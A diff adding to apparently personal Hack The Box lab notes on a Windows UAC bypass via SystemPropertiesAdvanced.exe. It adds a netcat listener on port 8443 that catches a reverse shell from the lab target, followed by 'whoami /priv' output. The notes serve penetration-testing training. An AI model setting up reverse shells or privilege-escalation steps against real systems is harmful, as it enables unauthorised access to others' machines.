@@ -61,3 +61,35 @@ rundll32 shell32.dll,Control_RunDLL \
 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 
+
+```shell-session
+bluechat@htb[/htb]$ nc -lnvp 8443
+
+listening on [any] 8443 ...
+
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+
+C:\Users\sarah> whoami /priv
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+```
+
+#### Executing SystemPropertiesAdvanced.exe on Target Host
+
+![[Pasted image 20230107111029.png]]
+
